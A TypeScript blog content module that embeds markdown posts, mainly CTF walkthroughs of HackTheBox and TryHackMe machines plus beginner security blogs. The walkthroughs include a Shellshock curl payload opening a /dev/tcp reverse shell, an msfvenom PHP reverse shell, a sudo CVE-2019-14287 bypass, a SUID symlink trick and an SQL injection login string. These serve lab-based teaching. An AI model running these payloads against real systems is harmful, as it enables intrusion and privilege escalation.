/**
 * Fuwari-style content system.
 * 
 * HOW TO ADD A POST:
 * 1. Copy your entire .md file content (frontmatter + body) into the `markdownFiles` array below.
 * 2. Give it a path like "writeups/my-post" or "blogs/my-post".
 * 3. That's it. Frontmatter is auto-parsed, slug/reading-time/type are auto-generated.
 *
 * Frontmatter format (same as Fuwari):
 * ---
 * title: My Post Title
 * published: 2024-08-05
 * description: "Short description"
 * image: "https://..." (optional)
 * tags: ["tag1", "tag2"]
 * category: Writeups
 * draft: false
 * ---
 */

export interface PostFrontmatter {
  title: string;
  published: string;
  description: string;
  image?: string;
  tags: string[];
  category: string;
  draft?: boolean;
  lang?: string;
}

export interface Post {
  slug: string;
  frontmatter: PostFrontmatter;
  content: string;
  readingTime: number;
  type: "writeup" | "blog";
}

function estimateReadingTime(text: string): number {
  const words = text.trim().split(/\s+/).length;
  return Math.max(1, Math.ceil(words / 200));
}

/** Simple browser-safe frontmatter parser (no Node dependencies) */
function parseFrontmatter(raw: string): { data: Record<string, any>; content: string } {
  const match = raw.match(/^---\r?\n([\s\S]*?)\r?\n---\r?\n([\s\S]*)$/);
  if (!match) return { data: {}, content: raw };

  const yamlBlock = match[1];
  const content = match[2];
  const data: Record<string, any> = {};

  for (const line of yamlBlock.split("\n")) {
    const idx = line.indexOf(":");
    if (idx === -1) continue;
    const key = line.slice(0, idx).trim();
    let val: any = line.slice(idx + 1).trim();

    // Remove surrounding quotes
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1);
    }
    // Parse booleans
    if (val === "true") val = true;
    else if (val === "false") val = false;
    // Parse arrays like ["a", "b"]
    else if (val.startsWith("[") && val.endsWith("]")) {
      try {
        val = JSON.parse(val);
      } catch {
        val = val.slice(1, -1).split(",").map((s: string) => s.trim().replace(/^["']|["']$/g, ""));
      }
    }
    data[key] = val;
  }

  return { data, content };
}

function parseMarkdown(path: string, raw: string): Post {
  const { data, content } = parseFrontmatter(raw);

  const frontmatter: PostFrontmatter = {
    title: data.title || "Untitled",
    published: data.published
      ? new Date(data.published).toISOString().split("T")[0]
      : "1970-01-01",
    description: data.description || "",
    image: data.image || "",
    tags: Array.isArray(data.tags) ? data.tags : [],
    category: data.category || "Uncategorized",
    draft: data.draft ?? false,
    lang: data.lang,
  };

  return {
    slug: path,
    frontmatter,
    content: content.trim(),
    readingTime: estimateReadingTime(content),
    type: path.startsWith("writeups/") ? "writeup" : "blog",
  };
}

// ─────────────────────────────────────────────
// ✏️  ADD YOUR MARKDOWN FILES HERE
//     Just paste the full .md content (with ---)
// ─────────────────────────────────────────────
const markdownFiles: { path: string; raw: string }[] = [
  {
    path: "writeups/htb-greenhorn",
    raw: `---
title: HTB Greenhorn — Full Walkthrough
published: 2025-12-15
description: "A complete walkthrough of the HackTheBox Greenhorn machine covering initial enumeration, web exploitation, and privilege escalation via misconfigured SUID binaries."
tags: ["HTB", "Linux", "Web", "Privesc"]
category: Writeups
draft: false
---

## Reconnaissance

We start with a full nmap scan to discover open ports and services.

\`\`\`bash
nmap -sC -sV -oN nmap/greenhorn 10.10.11.42
\`\`\`

Results show ports **22 (SSH)** and **80 (HTTP)** open. The web server is running **Pluck CMS 4.7.18**.

> **Info:** Pluck is a lightweight CMS written in PHP. Version 4.7.18 has a known file upload vulnerability.

## Foothold

### Discovering the Admin Panel

Navigating to \`/login.php\` reveals the admin login. Default credentials don't work, but we find a password hash in the backup files.

\`\`\`python
import hashlib

password = "iloveyou1"
hashed = hashlib.sha512(password.encode()).hexdigest()
print(f"Hash: {hashed}")
\`\`\`

### Exploiting File Upload

Once authenticated, we exploit the module upload feature to get a reverse shell:

\`\`\`bash
# Generate payload
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -o shell.php

# Set up listener
nc -lvnp 4444
\`\`\`

After uploading and triggering our shell, we get a callback as **www-data**.

## Privilege Escalation

Checking for SUID binaries reveals an interesting find:

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/custom-backup
\`\`\`

The binary runs as root and reads from a predictable path. We exploit this with a symlink attack:

\`\`\`bash
ln -sf /root/root.txt /tmp/backup-target
/usr/bin/custom-backup
cat /tmp/output
\`\`\`

## Root Flag

\`\`\`
flag{h4ckv3rs3_gr33nh0rn_pwn3d}
\`\`\`

> **Tip:** Always check for SUID binaries as part of your post-exploitation routine. Tools like \`linpeas\` automate this process.

## Key Takeaways

- Always enumerate CMS versions for known CVEs
- File upload vulnerabilities remain one of the most common web attack vectors
- SUID binaries are a frequent privilege escalation path on Linux
`,
  },
  {
    path: "writeups/thm-agent-sudo",
    raw: `---
title: THM Agent Sudo — Steganography & Sudo Exploit
published: 2025-11-28
description: "TryHackMe Agent Sudo room: user-agent manipulation, steganography extraction, zip cracking, and sudo CVE exploitation for root."
tags: ["THM", "Linux", "Stego", "CVE"]
category: Writeups
draft: false
---

## Introduction

Agent Sudo is a beginner-friendly TryHackMe room that covers a variety of techniques including user-agent spoofing, steganography, and a sudo CVE.

![](https://tryhackme-images.s3.amazonaws.com/room-icons/53d3c28c1af197142685ceb238d5ce3c.png)

## Enumeration

\`\`\`bash
nmap -sC -sV 10.10.10.50
\`\`\`

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 7.6p1 |
| 80   | HTTP    | Apache 2.4.29 |

## User-Agent Manipulation

The web page hints at using a special user-agent. Testing with \`curl\`:

\`\`\`bash
curl -A "C" -L http://10.10.10.50
\`\`\`

This reveals Agent C's name and a hint about weak FTP passwords.

## FTP & Steganography

After brute-forcing the FTP login with hydra, we find image files containing hidden data:

\`\`\`bash
binwalk -e cutie.png
zip2john 8702.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`

The extracted message gives us SSH credentials.

## Privilege Escalation

Checking sudo permissions:

\`\`\`bash
sudo -l
# (ALL, !root) /bin/bash
\`\`\`

> **Warning:** This sudo configuration is vulnerable to **CVE-2019-14287**!

\`\`\`bash
sudo -u#-1 /bin/bash
whoami
# root
\`\`\`

## Lessons Learned

1. User-Agent headers can be used for access control (and bypassed)
2. Steganography is a real technique used in CTFs and real-world scenarios
3. Keep sudo updated — CVE-2019-14287 affects versions < 1.8.28
`,
  },
  {
    path: "writeups/htb-shocker",
    raw: `---
title: HTB Shocker — Shellshock to Root
published: 2025-10-05
description: "Exploiting the classic Shellshock vulnerability (CVE-2014-6271) on HackTheBox Shocker machine. CGI enumeration, Bash exploitation, and sudo perl privesc."
tags: ["HTB", "Linux", "Web", "Shellshock"]
category: Writeups
draft: false
---

## Overview

Shocker is a classic HTB machine that demonstrates the infamous Shellshock vulnerability. Difficulty: Easy.

## Reconnaissance

\`\`\`bash
nmap -sC -sV -p- 10.10.10.56
\`\`\`

Open ports: **80** (Apache 2.4.18) and **2222** (SSH).

### CGI Enumeration

Shellshock targets CGI scripts, so we enumerate the \`/cgi-bin/\` directory:

\`\`\`bash
gobuster dir -u http://10.10.10.56/cgi-bin/ \\
  -w /usr/share/wordlists/dirb/common.txt \\
  -x sh,cgi,pl
\`\`\`

Found: \`/cgi-bin/user.sh\`

## Exploitation

### The Shellshock Attack

\`\`\`bash
curl -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd" \\
  http://10.10.10.56/cgi-bin/user.sh
\`\`\`

We get command execution! Let's get a reverse shell:

\`\`\`bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" \\
  http://10.10.10.56/cgi-bin/user.sh
\`\`\`

> **Info:** Shellshock (CVE-2014-6271) exploits how Bash processes environment variables, allowing arbitrary command execution through specially crafted strings.

## Privilege Escalation

\`\`\`bash
sudo -l
# User shelly may run the following commands:
#     (root) NOPASSWD: /usr/bin/perl
\`\`\`

Perl gives us an easy shell:

\`\`\`bash
sudo perl -e 'exec "/bin/sh";'
\`\`\`

And we're root! 🎉

## Summary

| Phase | Technique |
|-------|-----------|
| Recon | Nmap + CGI enumeration |
| Exploit | Shellshock (CVE-2014-6271) |
| Privesc | Sudo perl |

## References

- [CVE-2014-6271 - NIST](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [GTFOBins - Perl](https://gtfobins.github.io/gtfobins/perl/)
`,
  },
  {
    path: "blogs/why-i-love-linux",
    raw: `---
title: Why I Love Linux (And You Should Too)
published: 2025-12-01
description: "A love letter to the Linux operating system — from customization to security, here's why every cybersecurity enthusiast should embrace the penguin."
tags: ["Linux", "Opinion", "Beginner"]
category: Blogs
draft: false
---

## The Penguin Life

I've been using Linux for over five years now, and I can confidently say it has fundamentally changed how I think about computers, security, and software.

## Freedom to Tinker

The first thing that hooked me was the **freedom**. Not just "free as in beer" — free as in *you own your machine*. Every config file is yours to read. Every process is yours to inspect.

\`\`\`bash
# My first "wow" moment
cat /proc/cpuinfo
ls -la /etc/
systemctl list-units --type=service
\`\`\`

When you understand what your system is doing at every level, you become a better security practitioner.

## The Shell is Your Superpower

If you're in cybersecurity and not comfortable in the terminal, you're fighting with one hand tied behind your back.

\`\`\`bash
# Chain commands to do powerful things
find /var/log -name "*.log" -mtime -1 | xargs grep "FAILED" | sort | uniq -c | sort -rn | head -20
\`\`\`

> **Tip:** Start with \`bash\`, learn \`zsh\`, experiment with \`fish\`. The terminal is endlessly customizable.

## Security by Design

Linux's permission model, SELinux/AppArmor, namespaces, and cgroups provide defense-in-depth that Windows simply can't match out of the box.

## Distro Recommendations

| Use Case | Distro | Why |
|----------|--------|-----|
| Beginners | Ubuntu/Mint | Great docs, large community |
| Pentesting | Kali/Parrot | Pre-loaded tools |
| Daily driver | Fedora/Arch | Cutting edge, customizable |
| Servers | Debian/RHEL | Stability first |

## The Community

The Linux community is one of the most helpful and passionate groups in tech. From Reddit to Discord to IRC — there's always someone willing to help.

## Final Thoughts

If you haven't tried Linux yet, spin up a VM this weekend. Install Arch if you're brave. Install Mint if you want a smooth ride. Either way, you'll learn more about how computers *actually work* than any certification could teach you.
`,
  },
  {
    path: "blogs/ctf-beginner-guide",
    raw: `---
title: The Complete Beginner's Guide to CTFs
published: 2025-11-15
description: "Everything you need to know to start your Capture The Flag journey: platforms, tools, mindset, and your first challenge walkthrough."
tags: ["CTF", "Beginner", "Guide"]
category: Blogs
draft: false
---

## What Are CTFs?

Capture The Flag (CTF) competitions are cybersecurity challenges where you solve puzzles to find hidden "flags" — usually strings like \`flag{s0m3th1ng_h3r3}\`.

## Types of CTFs

### Jeopardy-Style
Categories of challenges with point values:
- **Web** — SQL injection, XSS, SSRF
- **Pwn** — Binary exploitation, buffer overflows
- **Crypto** — Encryption, hashing, math
- **Forensics** — Disk images, memory dumps, network captures
- **Reverse Engineering** — Malware analysis, binary reversing
- **Misc** — Everything else

### Attack-Defense
Teams defend their own services while attacking others. More advanced and typically found in on-site competitions.

## Getting Started

### Platforms

1. **TryHackMe** — Best for absolute beginners, guided rooms
2. **HackTheBox** — More challenging, great community
3. **PicoCTF** — Designed for students, excellent learning path
4. **OverTheWire** — Classic wargames, start with Bandit

### Essential Tools

\`\`\`bash
# Your starter toolkit
sudo apt install -y nmap gobuster john hydra \\
  binwalk steghide exiftool wireshark burpsuite
\`\`\`

> **Info:** You don't need to master every tool. Start with \`nmap\` and \`burpsuite\`, then expand your toolkit as you encounter new challenge types.

## Your First Challenge

Let's solve a simple web challenge. You're given a login form that might be vulnerable to SQL injection:

\`\`\`
Username: admin' OR '1'='1
Password: anything
\`\`\`

If the app uses unsanitized SQL queries, this bypasses authentication. The flag might be on the admin dashboard.

## Mindset Tips

1. **Google is your friend** — Most CTF skills come from research
2. **Take notes** — Document everything you try
3. **Don't give up too fast** — But don't bang your head for hours either
4. **Read writeups** — After competitions, study other solutions
5. **Join a team** — You'll learn faster and have more fun

## Conclusion

CTFs are the most fun way to learn cybersecurity. Start easy, stay consistent, and before you know it, you'll be solving challenges that once seemed impossible.
`,
  },
  {
    path: "blogs/building-home-lab",
    raw: `---
title: Building Your First Cybersecurity Home Lab
published: 2025-10-20
description: "A practical guide to setting up a home lab for pentesting practice, malware analysis, and network security experiments on a budget."
tags: ["Lab", "Networking", "Beginner", "Tools"]
category: Blogs
draft: false
---

## Why a Home Lab?

A home lab gives you a safe, legal environment to practice offensive and defensive security techniques. It's the single best investment you can make in your cybersecurity education.

## Hardware Requirements

You don't need enterprise gear. Here's what works:

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| RAM | 16 GB | 32 GB |
| CPU | 4 cores | 8+ cores |
| Storage | 256 GB SSD | 1 TB NVMe |
| Network | Built-in NIC | USB NIC for isolated network |

> **Tip:** An old gaming PC or a refurbished Dell OptiPlex makes an excellent lab machine for under $200.

## Software Stack

### Hypervisor

\`\`\`bash
# Install VirtualBox (free) or use VMware Workstation Pro (also free now!)
sudo apt install virtualbox virtualbox-ext-pack
\`\`\`

### Virtual Machines to Set Up

1. **Kali Linux** — Your attack machine
2. **Ubuntu Server** — Practice target
3. **Windows 10/11** — AD lab, malware analysis
4. **Metasploitable 2/3** — Purpose-built vulnerable machine
5. **DVWA** — Damn Vulnerable Web Application

### Network Architecture

\`\`\`
┌─────────────┐     ┌─────────────┐
│  Kali Linux │────▶│  Target VMs │
│  (Attacker) │     │  (Isolated) │
└─────────────┘     └─────────────┘
       │                    │
       └────────┬───────────┘
                │
        ┌───────┴───────┐
        │  Host-Only    │
        │  Network      │
        └───────────────┘
\`\`\`

> **Warning:** Never connect vulnerable VMs to your home network or the internet. Always use host-only or internal networking.

## Projects to Try

1. **Set up Active Directory** — Create a domain controller and join machines
2. **Deploy SIEM** — Install Wazuh or Security Onion for log analysis
3. **Network monitoring** — Use Suricata or Snort for IDS/IPS
4. **Malware analysis** — Set up FlareVM in an isolated environment

## Budget Breakdown

| Item | Cost |
|------|------|
| Used PC (16GB RAM) | $150-200 |
| Extra RAM (if needed) | $30-50 |
| USB NIC | $15 |
| Software | Free |
| **Total** | **~$200** |

## Conclusion

You don't need a server rack to start learning. A single machine with enough RAM to run a few VMs is all it takes. Start small, build up, and most importantly — **break things** (safely).
`,
  },
];

// ─────────────────────────────────────────────
// Build posts array (auto-parsed from raw markdown)
// ─────────────────────────────────────────────
export const posts: Post[] = markdownFiles
  .map((f) => parseMarkdown(f.path, f.raw))
  .filter((p) => !p.frontmatter.draft);

export function getPostBySlug(slug: string): Post | undefined {
  return posts.find((p) => p.slug === slug);
}

export function getAllTags(): string[] {
  const tagSet = new Set<string>();
  posts.forEach((p) => p.frontmatter.tags.forEach((t) => tagSet.add(t)));
  return Array.from(tagSet).sort();
}

export function getAllCategories(): string[] {
  const catSet = new Set<string>();
  posts.forEach((p) => catSet.add(p.frontmatter.category));
  return Array.from(catSet).sort();
}

export function getAdjacentPosts(slug: string): { prev: Post | null; next: Post | null } {
  const sorted = [...posts].sort(
    (a, b) =>
      new Date(b.frontmatter.published).getTime() -
      new Date(a.frontmatter.published).getTime()
  );
  const idx = sorted.findIndex((p) => p.slug === slug);
  return {
    prev: idx < sorted.length - 1 ? sorted[idx + 1] : null,
    next: idx > 0 ? sorted[idx - 1] : null,
  };
}
